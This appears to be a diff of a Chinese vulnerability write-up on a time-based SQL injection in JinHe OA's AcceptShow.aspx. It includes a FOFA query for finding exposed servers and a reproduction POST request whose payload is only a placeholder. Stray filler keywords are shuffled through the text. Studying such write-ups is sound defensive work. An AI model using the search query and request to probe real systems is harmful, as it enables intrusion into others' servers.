@@ -17,18 +17,8 @@ asset_dir: embedded-base64
 # fofa语法
 
 > app="金和网络-金和OA"
->
-> 计算机服务器
 
 # 漏洞分析
-
-深入探索
-
-数据管理
-
-软件
-
-搜索引擎
 
 根据 AcceptShow.aspx 的源码，在 bin 目录下查找 JHBase.Web.AcceptAip.dll 将其进行反编译后找到 `AcceptShow` 的处理逻辑
 
@@ -70,6 +60,14 @@ public static string GetFileID(string ModuleID, string ModuleMessageID)
 
 # 漏洞复现
 
+深入探索
+
+搜索引擎
+
+软件
+
+计算机服务器
+
 ```
 POST /c6/Jhsoft.Web.AcceptAip/AcceptShow.aspx/ HTTP/1.1
 Host: jhsoft.mrxn.net
@@ -82,4 +80,4 @@ id=SQLI_POC
 
 成功延时 5 秒
 
-编程
+数据管理
